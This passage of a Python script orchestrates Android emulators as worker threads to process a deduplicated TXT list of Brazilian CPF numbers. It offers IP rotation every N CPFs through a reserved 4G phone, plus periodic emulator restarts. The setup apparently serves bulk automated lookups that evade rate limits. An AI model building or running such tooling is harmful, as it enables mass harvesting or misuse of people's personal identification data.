    devices = [d for d in devices if d != DEVICE_4G]
    print(
        f"  {CINZA}Celular {DEVICE_4G} excluído dos workers "
        f"(reservado para rede).{RESET}"
    )
    if not devices:
        print(f"\n  {VERMELHO}Nenhum emulador restante para trabalho.{RESET}\n")
        sys.exit(1)

print()

# Limite de troca (irrelevante no modo normal mas coletado igual)
if MODO_IP != "normal":
    while True:
        val = input(
            f"  {AMARELO}Trocar IP a cada quantos CPFs?: {RESET}"
        ).strip()
        if val.isdigit() and int(val) > 0:
            LIMITE_TROCA_GLOBAL = int(val)
            break
        print(f"  {VERMELHO}Digite um número válido.{RESET}")
else:
    LIMITE_TROCA_GLOBAL = 99999  # Nunca dispara

print()

# Reinício preventivo do emulador
while True:
    val = input(
        f"  {AMARELO}Reiniciar emulador a cada quantos CPFs? "
        f"(0 para desativar): {RESET}"
    ).strip()
    if val.isdigit():
        REINICIAR_EMULADOR_A_CADA = int(val)
        if REINICIAR_EMULADOR_A_CADA == 0:
            print(f"  {CINZA}Reinício automático desativado.{RESET}")
        else:
            print(
                f"  {CINZA}Emuladores serão reiniciados a cada "
                f"{REINICIAR_EMULADOR_A_CADA} CPFs.{RESET}"
            )
        break
    print(f"  {VERMELHO}Digite um número válido.{RESET}")

print()

# Escolher pasta
pasta = input(
    f"  {AMARELO}Pasta com os TXT: {RESET}"
).strip().replace('"', "")

if not os.path.exists(pasta):
    print(f"\n  {VERMELHO}Pasta não encontrada.{RESET}\n")
    sys.exit(1)

txts = [f for f in os.listdir(pasta) if f.lower().endswith(".txt")]

if not txts:
    print(f"\n  {VERMELHO}Nenhum TXT encontrado.{RESET}\n")
    sys.exit(1)

print()
print(f"  {BRANCO}Arquivos encontrados:{RESET}")
for i, nome in enumerate(txts, start=1):
    print(f"  {CINZA}  [{i}]{RESET} {nome}")

print()
escolha_arq = input(f"  {AMARELO}Escolha o arquivo: {RESET}").strip()

if (
    not escolha_arq.isdigit()
    or not (1 <= int(escolha_arq) <= len(txts))
):
    print(f"\n  {VERMELHO}Escolha inválida.{RESET}\n")
    sys.exit(1)

arquivo = os.path.join(pasta, txts[int(escolha_arq) - 1])

# Ler CPFs — deduplica preservando ordem
with open(arquivo, "r", encoding="utf-8") as f:
    _linhas = [l.strip() for l in f if l.strip()]

_vistos = set()
cpfs = []
for cpf in _linhas:
    if cpf not in _vistos:
        _vistos.add(cpf)
        cpfs.append(cpf)

_duplicatas = len(_linhas) - len(cpfs)

if not cpfs:
    print(f"\n  {VERMELHO}Lista vazia.{RESET}\n")
    sys.exit(1)

fatias = dividir_lista(cpfs, len(devices))

# Resumo
print()
linha()
status("Modo IP:", MODO_IP.upper(), AMARELO)
if MODO_IP != "normal":
    status("Troca a cada:", f"{LIMITE_TROCA_GLOBAL} CPFs", AMARELO)
status("Total de CPFs:", str(len(cpfs)), BRANCO)
if _duplicatas:
    status("Duplicatas:", f"{_duplicatas} removidas", AMARELO)
status("Emuladores:", str(len(devices)), BRANCO)
linha()

for device, fatia in zip(devices, fatias):
    print(f"  {CINZA}  {device}{RESET}  →  {len(fatia)} CPFs")

print()
input(f"  {AMARELO}Enter para iniciar...{RESET}")
print()
linha()
print()

# Threads
threads = []
_inicio_total = time.time()

for i, (device, fatia) in enumerate(zip(devices, fatias)):
    worker = EmuladorWorker(device, fatia, i)
    t = threading.Thread(target=worker.run, name=device)
    threads.append(t)

for t in threads:
    t.start()

for t in threads:
    t.join()

_gasto = int(time.time() - _inicio_total)
_hms_gasto = f"{_gasto//3600:02d}h{(_gasto%3600)//60:02d}m{_gasto%60:02d}s"

print()
linha("═")
print(f"{BOLD}{VERDE}{'CONCLUÍDO':^46}{RESET}")
linha("═")
print(f"  {CINZA}Tempo total gasto: {RESET}{BRANCO}{_hms_gasto}{RESET}")
linha("═")
print()
os.system("pause")
